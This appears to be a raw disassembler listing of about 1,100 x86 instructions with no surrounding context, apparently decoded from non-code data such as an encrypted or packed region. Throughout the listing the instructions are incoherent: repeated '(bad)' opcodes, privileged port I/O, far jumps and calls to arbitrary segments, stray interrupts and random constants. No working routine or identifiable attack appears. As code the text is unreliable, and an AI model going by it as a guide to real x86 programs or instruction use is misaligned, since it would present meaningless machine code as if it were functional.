  4194c0:	cmp    al,BYTE PTR ds:0xf5013864
  4194c6:	es push edx
  4194c8:	and    BYTE PTR [ebp-0x4c],dl
  4194cb:	mov    edi,0xba4fa199
  4194d0:	pop    ecx
  4194d1:	imul   DWORD PTR [edx-0x23]
  4194d4:	mov    eax,ss
  4194d6:	pop    ecx
  4194d7:	dec    ebp
  4194d8:	xor    DWORD PTR [ecx-0x37],ebp
  4194db:	xchg   ebp,eax
  4194dc:	and    edi,esi
  4194de:	inc    eax
  4194df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194e0:	mov    ebx,0x6ff297ab
  4194e5:	mov    eax,ds:0xbfdbdf9f
  4194ea:	out    dx,eax
  4194eb:	loope  0x419520
  4194ed:	pop    ebx
  4194ee:	gs ja  0x41954f
  4194f1:	fbld   TBYTE PTR [edi+0x66f48c5d]
  4194f7:	xor    eax,0x46d897b2
  4194fc:	arpl   WORD PTR [eax],bp
  4194fe:	inc    esi
  4194ff:	mov    eax,0xb052d030
  419504:	jecxz  0x419520
  419506:	ret    
  419507:	cmp    BYTE PTR [ebx+0x49ea49f],bh
  41950d:	inc    edi
  41950e:	or     esi,DWORD PTR [edi+0x36]
  419511:	in     eax,0xe0
  419513:	sbb    BYTE PTR [ecx],bh
  419515:	add    DWORD PTR [ecx],esi
  419517:	iret   
  419518:	ins    DWORD PTR es:[edi],dx
  419519:	adc    DWORD PTR [ebx-0x18],ecx
  41951c:	adc    BYTE PTR [eax+0x2f7f6ac6],dl
  419522:	or     esi,DWORD PTR [ecx]
  419524:	dec    esp
  419525:	and    BYTE PTR [ebx+0x55],ch
  419528:	mov    edx,0x35b234e4
  41952d:	pop    edi
  41952e:	inc    ecx
  41952f:	sahf   
  419530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419531:	out    dx,eax
  419532:	pop    eax
  419533:	or     bl,BYTE PTR [esp+edi*2]
  419536:	fucom  st(6)
  419538:	(bad)  
  419539:	aaa    
  41953a:	leave  
  41953b:	jmp    0xd89f:0x986490cc
  419542:	test   al,0xb7
  419544:	xchg   esi,eax
  419545:	call   0xae074d9b
  41954a:	(bad)  
  41954b:	or     eax,0xcaf722db
  419550:	inc    esi
  419551:	outs   dx,BYTE PTR ds:[esi]
  419552:	jecxz  0x419526
  419554:	adc    al,0xc
  419556:	inc    edx
  419557:	cmp    ebx,ebx
  419559:	lods   al,BYTE PTR ds:[esi]
  41955a:	mov    BYTE PTR [esi],dh
  41955c:	aad    0x7c
  41955e:	mov    ebx,0x741e3972
  419563:	mov    eax,0xd617c67
  419568:	xchg   ebx,eax
  419569:	mov    esp,0x3c8a43fb
  41956e:	mov    al,ds:0x1f88b703
  419573:	lds    esp,FWORD PTR [edi]
  419575:	mov    dh,0xb5
  419577:	adc    BYTE PTR [edx],cl
  419579:	inc    edi
  41957a:	cwde   
  41957b:	jl     0x41954c
  41957d:	jmp    0x20ad:0x86d1836d
  419584:	xchg   edx,eax
  419585:	dec    ecx
  419586:	cmp    edx,DWORD PTR [ebx+0x9f5733e]
  41958c:	and    DWORD PTR [ecx+eax*1],edi
  41958f:	cmp    ebp,DWORD PTR [ecx+edx*2-0x3d]
  419593:	test   eax,0x1b39ab46
  419598:	stos   DWORD PTR es:[edi],eax
  419599:	sub    cl,BYTE PTR [ebp-0x2d]
  41959c:	(bad)  
  41959d:	nop
  41959e:	mov    ds:0x24e6c778,al
  4195a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195a4:	in     eax,dx
  4195a5:	xchg   ebx,eax
  4195a6:	stos   DWORD PTR es:[edi],eax
  4195a7:	stos   DWORD PTR es:[edi],eax
  4195a8:	in     eax,0x31
  4195aa:	mov    bh,0x79
  4195ac:	xlat   BYTE PTR ds:[ebx]
  4195ad:	jae    0x419576
  4195af:	fwait
  4195b0:	(bad)  
  4195b1:	and    al,0x5e
  4195b3:	dec    ecx
  4195b4:	or     ebp,DWORD PTR [edx+0x7c]
  4195b7:	xchg   ebx,eax
  4195b8:	ds fwait
  4195ba:	mov    bh,0x8
  4195bc:	outs   dx,BYTE PTR ds:[esi]
  4195bd:	pop    ebx
  4195be:	pushf  
  4195bf:	outs   dx,BYTE PTR ds:[esi]
  4195c0:	cld    
  4195c1:	and    esp,DWORD PTR [edi+eiz*4+0xe]
  4195c5:	adc    cl,0x1
  4195c8:	add    ah,BYTE PTR [edi-0xa]
  4195cb:	sub    esp,DWORD PTR [ebx+ecx*2-0x242c0e89]
  4195d2:	popf   
  4195d3:	xchg   BYTE PTR [edx-0x53858618],ch
  4195d9:	add    DWORD PTR [ebx],esi
  4195db:	sti    
  4195dc:	or     eax,0xc909d53a
  4195e1:	inc    edx
  4195e2:	xchg   esi,eax
  4195e3:	or     DWORD PTR [ebx],edi
  4195e5:	xor    ebp,esp
  4195e7:	push   edi
  4195e8:	xor    BYTE PTR [ebp+0x41],al
  4195eb:	clc    
  4195ec:	sbb    eax,0xbac36675
  4195f1:	xchg   ecx,eax
  4195f2:	sahf   
  4195f3:	out    0x61,al
  4195f5:	sbb    ch,cl
  4195f7:	inc    ebx
  4195f8:	inc    ebx
  4195f9:	fcmovne st,st(1)
  4195fb:	neg    cl
  4195fd:	add    esp,DWORD PTR [ebx]
  4195ff:	pop    edi
  419600:	pop    eax
  419601:	cmp    al,0xe8
  419603:	shl    DWORD PTR [esi+0x4],0x18
  419607:	pop    ecx
  419608:	cmp    eax,DWORD PTR [ebx-0x53]
  41960b:	inc    esp
  41960c:	pop    edi
  41960d:	es ds sub eax,0x8cb3de63
  419614:	pop    ds
  419615:	fist   WORD PTR [esi-0x23]
  419618:	dec    edi
  419619:	sub    al,0x42
  41961b:	fidivr WORD PTR [edi+0x17]
  41961e:	inc    edx
  41961f:	mov    ah,0x38
  419621:	jp     0x419681
  419623:	mov    bl,0x2
  419625:	inc    ebx
  419626:	mov    edi,0x63f9dd69
  41962b:	loope  0x4196a0
  41962d:	(bad)  
  41962f:	fs inc ebx
  419631:	fnsave cs:[edx+0x1d]
  419635:	cmp    esp,ecx
  419637:	sbb    al,al
  419639:	(bad)  
  41963a:	ror    BYTE PTR [eax],1
  41963c:	daa    
  41963d:	cs loop 0x419691
  419640:	mov    ebx,0x2d5b197d
  419645:	inc    esi
  419646:	add    BYTE PTR [eax-0x4126dad9],bh
  41964c:	std    
  41964d:	fwait
  41964e:	jb     0x4196b5
  419650:	cmp    al,0xb7
  419652:	add    BYTE PTR [esi+0x2d],al
  419655:	out    0x43,al
  419657:	mov    ebx,0xa47447b1
  41965c:	pop    ebx
  41965d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41965e:	mov    ebx,0x5346fbbf
  419663:	in     eax,0x8c
  419665:	sub    esp,DWORD PTR [edx]
  419667:	out    0xe1,al
  419669:	aad    0x8f
  41966b:	test   DWORD PTR [edx+0x6f30fcd8],ebx
  419671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419672:	ss out dx,eax
  419674:	scas   al,BYTE PTR es:[edi]
  419675:	adc    eax,0x60af85c4
  41967a:	add    eax,ebx
  41967c:	sub    al,0x1d
  41967f:	dec    edx
  419680:	mov    cl,0xb2
  419682:	xor    DWORD PTR [ecx+0x3a],ebp
  419685:	stos   BYTE PTR es:[edi],al
  419686:	dec    esi
  419687:	jno    0x4196d8
  419689:	xor    BYTE PTR [esi+0xe8a9909],ah
  41968f:	sub    DWORD PTR [edi+0x42],edx
  419692:	push   dx
  419694:	mov    esi,0xd8dd118b
  419699:	test   al,0x6b
  41969b:	cmp    al,0x89
  41969d:	iret   
  41969e:	mov    BYTE PTR [ecx-0x219bfbd6],dl
  4196a4:	xchg   BYTE PTR [esi-0x55],dl
  4196a7:	or     al,0xf6
  4196a9:	les    ebp,FWORD PTR [ebx+0x7bc43157]
  4196af:	or     al,0xba
  4196b1:	dec    ecx
  4196b2:	inc    ebx
  4196b3:	and    BYTE PTR [ecx],bh
  4196b5:	ret    0x260
  4196b8:	cmp    al,0xa3
  4196ba:	mov    dl,0xd6
  4196bc:	sbb    eax,0xcde0b178
  4196c1:	aad    0x53
  4196c3:	mov    ebx,0x879686a
  4196c8:	mov    eax,ds:0x9e22aeb7
  4196cd:	cld    
  4196ce:	retf   
  4196cf:	dec    edx
  4196d0:	retf   0xa8df
  4196d3:	pop    ecx
  4196d4:	pop    ebp
  4196d5:	dec    edi
  4196d6:	gs push 0xfffffff5
  4196d9:	icebp  
  4196da:	and    cl,bl
  4196dc:	sti    
  4196dd:	fs aam 0xd
  4196e0:	loopne 0x419743
  4196e2:	xchg   ecx,eax
  4196e3:	int    0x2f
  4196e5:	sub    dl,0xbd
  4196e8:	xor    eax,0x2dedfc37
  4196ed:	stc    
  4196ee:	sbb    edx,esi
  4196f0:	mov    ch,0xe3
  4196f2:	fsubr  st,st(3)
  4196f4:	stos   BYTE PTR es:[edi],al
  4196f5:	loopne 0x419729
  4196f7:	cmp    DWORD PTR [edx+0x48],ebp
  4196fa:	cmp    al,0xe2
  4196fc:	push   ecx
  4196fd:	xchg   DWORD PTR [eax+0x3a],ecx
  419700:	jl     0x4196c0
  419702:	xor    dh,bh
  419704:	xor    BYTE PTR [esi+0x69],bl
  419707:	pop    ss
  419708:	mov    al,ds:0xe84403a9
  41970d:	dec    edi
  41970e:	test   bh,ch
  419710:	and    al,0x26
  419712:	pop    ebp
  419713:	cdq    
  419714:	call   0xfc66feab
  419719:	xchg   ecx,eax
  41971a:	je     0x4196e4
  41971c:	dec    esp
  41971d:	push   eax
  41971e:	and    ebp,DWORD PTR [eax]
  419720:	cld    
  419721:	inc    ebp
  419722:	fst    st(1)
  419724:	(bad)
  419727:	nop
  419728:	hlt    
  419729:	ss mov ecx,0xc80033da
  41972f:	rcr    dh,cl
  419731:	mov    bh,BYTE PTR [esi-0x3afbc722]
  419737:	loope  0x419709
  419739:	(bad)  
  41973a:	cmc    
  41973b:	inc    edi
  41973c:	mov    esi,0x147fa319
  419741:	lahf   
  419742:	pop    ecx
  419743:	sub    al,0xe5
  419745:	xchg   edx,eax
  419746:	lahf   
  419747:	pop    es
  419748:	jno    0x4196d1
  41974a:	pop    edx
  41974b:	shr    DWORD PTR [ebx+0x722adb29],1
  419751:	xchg   esi,eax
  419752:	(bad)  
  419753:	lea    ecx,[ecx]
  419755:	push   ds
  419756:	arpl   WORD PTR [ebx+0x79],sp
  419759:	fidivr DWORD PTR [ebp+0x7b]
  41975c:	dec    edi
  41975d:	shl    BYTE PTR [esi-0x22aa2df4],1
  419763:	push   0xfffffffd
  419765:	xlat   BYTE PTR ds:[ebx]
  419766:	fidivr WORD PTR [eax]
  419768:	data16 ficomp DWORD PTR [edi-0x5c]
  41976c:	fisttp WORD PTR [eax-0x2b]
  41976f:	mov    eax,ds:0x1e35ee9b
  419774:	fwait
  419775:	gs cmp ah,al
  419778:	(bad)  
  419779:	(bad)  
  41977a:	aad    0x79
  41977c:	cs dec ecx
  41977e:	dec    edx
  41977f:	jl     0x4197f6
  419781:	in     eax,dx
  419782:	pop    ds
  419783:	jno    0x41978f
  419785:	xor    DWORD PTR [edx],eax
  419787:	sub    BYTE PTR ds:0xe3f70eb4,al
  41978d:	icebp  
  41978e:	mov    eax,ds:0x6cf86323
  419793:	push   ss
  419794:	repnz adc ah,BYTE PTR [ecx+0x7dd7184]
  41979b:	inc    edx
  41979c:	mov    bh,0xb7
  41979e:	mov    dh,0xd
  4197a0:	inc    ebp
  4197a1:	pop    eax
  4197a2:	xor    DWORD PTR ds:0xfce8cd24,0xffffffcb
  4197a9:	inc    esi
  4197aa:	pushf  
  4197ab:	pusha  
  4197ac:	inc    esp
  4197ad:	sbb    DWORD PTR [ecx],edx
  4197af:	adc    esp,edi
  4197b1:	and    BYTE PTR [ebx-0x5f],dh
  4197b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197b5:	fisub  DWORD PTR [esi]
  4197b7:	int3   
  4197b8:	ins    BYTE PTR es:[edi],dx
  4197b9:	fbld   TBYTE PTR [esi+0x64a6d144]
  4197bf:	loopne 0x4197d5
  4197c1:	jge    0x41983e
  4197c3:	into   
  4197c4:	mov    ax,ds:0xb9077d38
  4197ca:	pop    ebx
  4197cb:	dec    esp
  4197cc:	mov    BYTE PTR [ecx+edi*2+0xa7c06f7],al
  4197d3:	push   ds
  4197d4:	aas    
  4197d5:	setbe  BYTE PTR [ebx-0x75e132f5]
  4197dc:	lods   al,BYTE PTR ds:[esi]
  4197dd:	mov    ecx,0x9fd0b4dc
  4197e2:	pop    ds
  4197e3:	cmp    al,0xf3
  4197e5:	adc    dl,ah
  4197e7:	sbb    ch,BYTE PTR [edi-0x12]
  4197ea:	(bad)  
  4197eb:	outs   dx,BYTE PTR ds:[esi]
  4197ec:	inc    ecx
  4197ed:	sbb    bh,BYTE PTR [ebx+0x2f]
  4197f0:	mov    ebx,0x4880f256
  4197f5:	stc    
  4197f6:	mov    eax,0xcb924394
  4197fb:	cmp    BYTE PTR [esi],al
  4197fd:	dec    edx
  4197fe:	sbb    ch,BYTE PTR [ecx]
  419800:	stos   BYTE PTR es:[edi],al
  419801:	and    eax,0xdf5f2252
  419806:	pop    ecx
  419807:	retf   0x311f
  41980a:	sbb    dl,BYTE PTR [edi+0x5d8688f5]
  419810:	(bad)  
  419812:	imul   ecx,DWORD PTR [eax+0x64],0x7a
  419816:	push   edx
  419817:	or     al,0x9
  419819:	and    bh,BYTE PTR ss:[esi]
  41981c:	gs dec esi
  41981e:	jmp    0x419830
  419820:	(bad)  
  419821:	mov    ebx,0x56c4a4f3
  419826:	mov    ds:0x84cba74f,al
  41982b:	and    ecx,DWORD PTR [ebx]
  41982d:	jmp    0x4197c7
  41982f:	imul   ebp,DWORD PTR [edi+0x636df9a2],0xffffffde
  419836:	add    al,0x3f
  419838:	xor    edi,DWORD PTR [ebx-0x21dbefa0]
  41983e:	push   esp
  41983f:	pusha  
  419840:	mov    dl,0xed
  419842:	mov    eax,0xe1adf20a
  419847:	pop    eax
  419848:	cld    
  419849:	hlt    
  41984a:	repz adc eax,0x2cf08e46
  419850:	mov    ebp,0xcec0dda8
  419855:	aaa    
  419856:	lea    eax,[eax+0x52dd138d]
  41985c:	mov    ds:0x258f0d34,al
  419861:	mov    dl,0xa7
  419863:	xor    eax,0xe63f4f6d
  419868:	dec    esp
  419869:	call   FWORD PTR [esi+0x68]
  41986c:	shl    DWORD PTR ds:0x2392ef57,1
  419872:	daa    
  419873:	mov    dh,bl
  419875:	lock das 
  419877:	add    BYTE PTR [ecx-0x39],dl
  41987a:	jmp    0xdc83:0x45c8210f
  419881:	loop   0x4198ee
  419883:	int    0x2d
  419885:	mov    esi,0x9ad52dde
  41988a:	popa   
  41988b:	dec    ebp
  41988c:	shr    bh,1
  41988e:	dec    esp
  41988f:	mov    WORD PTR [esi+0x342382b7],fs
  419895:	shl    DWORD PTR [esi-0x26a5e35e],cl
  41989b:	int    0x29
  41989d:	ficomp WORD PTR cs:[edx+0x45c3b826]
  4198a4:	addr16 out 0x68,eax
  4198a7:	mov    ecx,0xdb647e61
  4198ac:	aaa    
  4198ad:	push   ss
  4198ae:	push   ss
  4198af:	mov    dl,0xc1
  4198b1:	cli    
  4198b2:	retf   0xcd91
  4198b5:	int3   
  4198b6:	xor    ah,BYTE PTR [ecx]
  4198b8:	lahf   
  4198b9:	(bad)  
  4198ba:	clc    
  4198bb:	sbb    BYTE PTR [edx],dl
  4198bd:	int    0x64
  4198bf:	mov    ebp,0x74742daa
  4198c4:	jb     0x4198e9
  4198c6:	in     al,dx
  4198c7:	and    DWORD PTR [eax],ecx
  4198c9:	lock or BYTE PTR [eax],0xaf
  4198cd:	push   ss
  4198ce:	(bad)  
  4198cf:	jmp    0xa2e4:0x12e0e189
  4198d6:	mov    ah,0x71
  4198d8:	mov    ebx,0x462e9533
  4198dd:	add    eax,0xbd0f55d1
  4198e2:	scas   eax,DWORD PTR es:[edi]
  4198e3:	adc    eax,0xe332eecd
  4198e8:	gs bnd jl 0x4198c7
  4198ec:	and    BYTE PTR [ebp-0x12059bf],dl
  4198f2:	mov    al,0x66
  4198f4:	loope  0x419890
  4198f6:	push   esp
  4198f7:	sub    ah,BYTE PTR [ebx-0x40]
  4198fa:	xchg   ecx,eax
  4198fb:	and    edi,ebp
  4198fd:	dec    eax
  4198fe:	leave  
  4198ff:	dec    ebx
  419900:	mov    ah,0x37
  419902:	xchg   esi,eax
  419903:	(bad)  
  419904:	mov    eax,0x84b7fcf0
  419909:	loop   0x4198d4
  41990b:	pushf  
  41990c:	cmp    bh,BYTE PTR [esi-0x56]
  41990f:	mov    bh,BYTE PTR [edi-0x74]
  419912:	cmp    DWORD PTR [ebx-0x792a1615],ebx
  419918:	icebp  
  419919:	adc    ebx,edx
  41991b:	test   BYTE PTR [edx-0x5de9be60],dh
  419921:	mov    ch,0x46
  419923:	add    al,0xb
  419925:	les    ecx,FWORD PTR [ecx+0x19]
  419928:	ins    BYTE PTR es:[edi],dx
  419929:	sub    DWORD PTR [edi],ebx
  41992b:	ret    
  41992c:	add    esp,DWORD PTR [edi-0x67]
  41992f:	out    dx,al
  419930:	pop    esp
  419931:	stos   BYTE PTR es:[edi],al
  419932:	add    eax,0x7909241d
  419937:	bound  ecx,QWORD PTR [esi-0x46]
  41993a:	add    DWORD PTR [esi],esp
  41993c:	xor    al,0x57
  41993e:	popf   
  41993f:	ds or  al,0xe6
  419942:	pushf  
  419943:	adc    al,0x87
  419945:	jb     0x419926
  419947:	or     eax,0x17a878ae
  41994c:	retf   
  41994d:	imul   eax,esi,0xffffffdb
  419950:	xor    eax,0x9be133f5
  419955:	cmp    DWORD PTR [edi+0x6e],0xf432b0c3
  41995c:	push   0x64
  41995e:	push   ebx
  41995f:	xchg   ecx,eax
  419960:	mov    eax,ds:0x1f08c688
  419965:	in     al,0xa7
  419967:	arpl   WORD PTR [esi],bx
  419969:	ret    0xc9d8
  41996c:	clc    
  41996d:	aad    0x11
  41996f:	or     BYTE PTR [edi],0xd5
  419972:	mov    al,0x23
  419974:	int3   
  419975:	adc    dl,BYTE PTR [ebx+0x65]
  419978:	xchg   BYTE PTR [edx],ah
  41997a:	jmp    0xa1797e8b
  41997f:	(bad)  
  419980:	pop    ebp
  419981:	xor    DWORD PTR gs:[esi+0x5f6f6e94],ecx
  419988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419989:	add    DWORD PTR [eax],esi
  41998b:	imul   edx,DWORD PTR [eax+0x5b],0xf
  41998f:	mov    al,0x9b
  419991:	jecxz  0x419977
  419993:	jnp    0x419960
  419995:	repnz pop ecx
  419997:	push   0x82bb4a21
  41999c:	add    al,0xd1
  41999e:	test   bh,al
  4199a0:	rcl    BYTE PTR [eax+0x20],1
  4199a3:	inc    esp
  4199a4:	mov    dh,0x56
  4199a6:	jno    0x419941
  4199a8:	out    dx,eax
  4199a9:	leave  
  4199aa:	mov    eax,ds:0x67dce638
  4199af:	mov    al,ds:0x40a91d89
  4199b4:	scas   eax,DWORD PTR es:[edi]
  4199b5:	jno    0x419a07
  4199b7:	int    0x8
  4199b9:	or     al,0x5f
  4199bb:	mov    ds:0x49cc371d,eax
  4199c0:	add    esi,eax
  4199c2:	mov    bl,0x3a
  4199c4:	sub    dh,BYTE PTR cs:[ebp-0x3a6dabb7]
  4199cb:	jge    0x419990
  4199cd:	mov    dh,0x85
  4199cf:	or     al,0xe2
  4199d1:	and    BYTE PTR [edx],dh
  4199d3:	sub    dl,BYTE PTR [esi]
  4199d5:	mov    edx,0xa19cb710
  4199da:	or     al,0x5a
  4199dc:	(bad)  
  4199dd:	outs   dx,BYTE PTR ds:[esi]
  4199de:	add    al,0x24
  4199e0:	inc    edi
  4199e1:	cld    
  4199e2:	or     DWORD PTR [eax+0x58c84f6d],esp
  4199e8:	adc    bl,BYTE PTR [ebp-0xe9d5976]
  4199ee:	aas    
  4199ef:	stos   DWORD PTR es:[edi],eax
  4199f0:	retf   0x4dc9
  4199f3:	push   ebx
  4199f4:	retf   0x90dd
  4199f7:	ret    0x3975
  4199fa:	sahf   
  4199fb:	adc    ah,dh
  4199fd:	push   0x83f66cf8
  419a02:	(bad)  
  419a03:	lock fsub QWORD PTR [edi-0xe]
  419a07:	popf   
  419a08:	xor    al,0x52
  419a0a:	sbb    bl,BYTE PTR [edx-0x37]
  419a0d:	pop    ds
  419a0e:	iret   
  419a0f:	hlt    
  419a10:	pminub mm4,mm1
  419a13:	out    0xd4,al
  419a15:	xchg   ebp,eax
  419a16:	aaa    
  419a17:	(bad)  
  419a18:	neg    BYTE PTR [eax+0x61]
  419a1b:	sub    eax,0xef9a7a74
  419a20:	sbb    BYTE PTR [ecx+0x750ec4e3],cl
  419a26:	in     al,0xf7
  419a28:	add    al,0x97
  419a2a:	daa    
  419a2b:	loope  0x419a97
  419a2d:	mov    esi,0x457544ce
  419a32:	xor    edi,edi
  419a34:	or     BYTE PTR [esi+edx*8],cl
  419a37:	and    esi,DWORD PTR [edx]
  419a39:	pop    edx
  419a3a:	stos   BYTE PTR es:[edi],al
  419a3b:	xchg   BYTE PTR [edx+0x85c21d9],bh
  419a41:	ss inc ebx
  419a43:	or     BYTE PTR [esp+ebx*8],dl
  419a46:	(bad)  
  419a47:	xor    eax,0x313bf9d
  419a4c:	stos   DWORD PTR es:[edi],eax
  419a4d:	into   
  419a4e:	arpl   WORD PTR [edi+0x799d9145],di
  419a54:	cld    
  419a55:	std    
  419a56:	adc    BYTE PTR [edi],ch
  419a58:	jmp    0x84e2cdef
  419a5d:	daa    
  419a5e:	neg    DWORD PTR [edx]
  419a60:	sub    DWORD PTR [eax+ecx*1+0x5244055d],edx
  419a67:	mov    bl,0x2c
  419a69:	inc    BYTE PTR [edx-0x1ea90b80]
  419a6f:	jmp    0x6dd267f1
  419a74:	test   BYTE PTR [ecx-0x53ec63cc],bh
  419a7a:	jb     0x4199fc
  419a7c:	push   eax
  419a7d:	dec    eax
  419a7e:	aam    0x34
  419a80:	out    0xc3,al
  419a82:	mov    dl,0xd2
  419a84:	push   eax
  419a85:	pop    esi
  419a86:	sub    esi,DWORD PTR [ebx+0x6e71ed4e]
  419a8c:	cmp    ebp,edx
  419a8e:	mov    ebp,0x233b3e7e
  419a93:	pop    esp
  419a94:	dec    ecx
  419a95:	push   esi
  419a96:	leave  
  419a97:	(bad)  
  419a98:	and    edi,DWORD PTR [edx+esi*2]
  419a9b:	pop    eax
  419a9c:	sbb    bh,BYTE PTR [esi+0x5c]
  419a9f:	shr    ch,cl
  419aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aa2:	loope  0x419a57
  419aa4:	ins    DWORD PTR es:[edi],dx
  419aa5:	imul   edi,DWORD PTR [ecx+0x3c],0x4d2235e1
  419aac:	mov    DWORD PTR [eax+edx*8-0x32f72ce9],eax
  419ab3:	mov    ds:0xc8e47039,eax
  419ab8:	sub    ebx,DWORD PTR ds:0x7f4cffe0
  419abe:	dec    edi
  419abf:	ss sbb eax,0x7360908a
  419ac5:	sbb    edi,DWORD PTR [edi]
  419ac7:	push   edi
  419ac8:	sub    DWORD PTR [edx],ebp
  419aca:	shl    DWORD PTR [ebx],cl
  419acc:	inc    edx
  419acd:	xchg   esi,eax
  419ace:	lods   eax,DWORD PTR ds:[esi]
  419acf:	cdq    
  419ad0:	(bad)  
  419ad1:	mov    dl,0xe
  419ad3:	daa    
  419ad4:	shl    DWORD PTR [ebx+0x239b26f1],1
  419ada:	jne    0x419b51
  419adc:	out    dx,al
  419add:	mov    edi,0x7e0e1291
  419ae2:	adc    eax,0x646c52fb
  419ae7:	jecxz  0x419ae0
  419ae9:	repz push esi
  419aeb:	sbb    dh,bl
  419aed:	test   eax,0xc8b8bb2d
  419af2:	lods   al,BYTE PTR ds:[esi]
  419af3:	xor    al,0x68
  419af5:	lods   al,BYTE PTR ds:[esi]
  419af6:	mov    DWORD PTR [edi+ecx*1],edx
  419af9:	sbb    al,0x59
  419afb:	fisttp DWORD PTR [ebp+esi*1+0x63eb6067]
  419b02:	add    eax,0x1869fe26
  419b07:	mov    dl,0xa0
  419b09:	cwde   
  419b0a:	fisttp DWORD PTR [esi-0x55ed3c73]
  419b10:	pop    ecx
  419b11:	seta   BYTE PTR [ebx]
  419b14:	mov    esp,0x4eb8166c
  419b19:	mov    al,dl
  419b1b:	jbe    0x419aaa
  419b1d:	jl     0x419b6a
  419b1f:	push   cs
  419b20:	mov    edx,0xc0ed0b1b
  419b25:	call   0xfe06d6f5
  419b2a:	push   eax
  419b2b:	aad    0xe0
  419b2d:	lods   eax,DWORD PTR ds:[esi]
  419b2e:	imul   eax,DWORD PTR [ebx-0x1279367d],0xffffffb1
  419b35:	cmp    dl,BYTE PTR [edx-0x11d37113]
  419b3b:	ins    DWORD PTR es:[edi],dx
  419b3c:	mov    edx,0x3b3f37a5
  419b41:	xor    bl,dh
  419b43:	mov    ch,0xc4
  419b45:	sti    
  419b46:	ins    BYTE PTR es:[edi],dx
  419b47:	or     ch,BYTE PTR [ebx+0x1bb25e77]
  419b4d:	pop    ebp
  419b4e:	(bad)  
  419b4f:	in     eax,dx
  419b50:	retf   
  419b51:	xchg   edx,eax
  419b52:	aad    0x82
  419b54:	shl    BYTE PTR [ebp-0x6b],1
  419b57:	inc    ecx
  419b58:	mul    BYTE PTR [esi+0x5e]
  419b5b:	sub    BYTE PTR [ecx],dh
  419b5d:	fdivr  st,st(7)
  419b5f:	mov    esp,0x90b71622
  419b64:	sbb    al,0x5e
  419b66:	int    0x1f
  419b68:	jmp    0x2788:0x1bfef51
  419b6f:	push   ebx
  419b70:	aas    
  419b71:	sub    edi,DWORD PTR [edx-0x34]
  419b74:	dec    eax
  419b75:	adc    bl,BYTE PTR [ecx+0x1d]
  419b78:	imul   ebp,DWORD PTR [esi*2-0x51d3d101],0xffffffbd
  419b80:	add    al,0x74
  419b82:	outs   dx,DWORD PTR ds:[esi]
  419b83:	push   esi
  419b84:	lahf   
  419b85:	fisubr WORD PTR [ebp+0x6d]
  419b88:	jle    0x419bc8
  419b8a:	loopne 0x419ba7
  419b8c:	sub    DWORD PTR [esi-0x3833a7ac],ecx
  419b92:	loop   0x419b7e
  419b94:	popf   
  419b95:	ret    0xf8a9
  419b98:	add    ch,BYTE PTR [edx]
  419b9a:	or     DWORD PTR [edx+0x59],esi
  419b9d:	mov    ebp,0x1c24fee0
  419ba2:	das    
  419ba3:	xor    al,0x7c
  419ba5:	jmp    0x419b98
  419ba7:	cmp    DWORD PTR [ebp-0x24],0xf6bd5130
  419bae:	sbb    bl,dh
  419bb0:	cmp    edi,eax
  419bb2:	lea    eax,[ebx-0x32]
  419bb5:	pop    eax
  419bb6:	jne    0x419b8d
  419bb8:	mov    DWORD PTR [edx],ebp
  419bba:	lds    ebx,FWORD PTR [ecx+0x5e]
  419bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bbe:	aas    
  419bbf:	add    al,0xce
  419bc1:	pminsw mm4,mm5
  419bc4:	xor    DWORD PTR [edx-0x5f],ecx
  419bc7:	push   ebx
  419bc8:	call   0x9d40:0x45987712
  419bcf:	jge    0x419c4b
  419bd1:	mov    ch,BYTE PTR [edi-0x62]
  419bd4:	xor    edi,DWORD PTR [edi-0x7f]
  419bd7:	or     DWORD PTR [edx],edx
  419bd9:	dec    edx
  419bda:	in     al,0x30
  419bdc:	das    
  419bdd:	stos   DWORD PTR es:[edi],eax
  419bde:	fdivr  DWORD PTR [edi+0x38]
  419be1:	dec    esi
  419be2:	stos   BYTE PTR es:[edi],al
  419be3:	test   eax,0xae14b64
  419be8:	dec    ebx
  419be9:	or     BYTE PTR ds:[eax+0xcbb26f4],dh
  419bf0:	mov    edx,DWORD PTR [edx]
  419bf2:	jle    0x419c09
  419bf4:	ss xchg ebx,eax
  419bf6:	jbe    0x419ba3
  419bf8:	cmp    DWORD PTR [eax],eax
  419bfa:	inc    edi
  419bfb:	xchg   edx,eax
  419bfc:	int    0x2
  419bfe:	idiv   eax
  419c00:	jmp    0x419bbd
  419c02:	adc    BYTE PTR [esi+0xe],bl
  419c05:	cmp    eax,0x4d61c32e
  419c0a:	or     al,0x3d
  419c0c:	popf   
  419c0d:	daa    
  419c0e:	stc    
  419c0f:	inc    edx
  419c10:	out    dx,al
  419c11:	js     0x419c3d
  419c13:	push   ebx
  419c14:	mov    ds:0xedce808b,eax
  419c19:	push   esi
  419c1a:	cmp    al,0x3b
  419c1c:	sub    BYTE PTR [esi+esi*2+0x28c56812],al
  419c23:	leave  
  419c24:	ret    0x5e6
  419c27:	or     DWORD PTR [ebp+ebx*1-0x33],ebp
  419c2b:	imul   edx,DWORD PTR [esi-0x68c450f7],0x1cae9a94
  419c35:	fstp   DWORD PTR [eax+0x7c]
  419c38:	add    dl,dh
  419c3a:	sbb    al,0xa1
  419c3c:	shr    DWORD PTR ds:0x346ebe15,1
  419c42:	fdivp  st(2),st
  419c44:	aas    
  419c45:	inc    eax
  419c46:	inc    edx
  419c47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c48:	jle    0x419c8f
  419c4a:	js     0x419beb
  419c4c:	popf   
  419c4d:	pop    es
  419c4e:	xchg   DWORD PTR [ebp+0x5d],esp
  419c51:	ror    DWORD PTR [eax-0x75],cl
  419c54:	into   
  419c55:	mov    ah,0x2b
  419c57:	ret    0xdbdc
  419c5a:	and    ax,0x4d2
  419c5e:	jmp    0x419cb6
  419c60:	sub    BYTE PTR [edi+0x175428f4],dl
  419c66:	(bad)  
  419c67:	fnsave [ecx]
  419c69:	stos   BYTE PTR es:[edi],al
  419c6a:	xchg   DWORD PTR [edi-0x5],edx
  419c6d:	mov    ebp,0x94084ed0
  419c72:	popa   
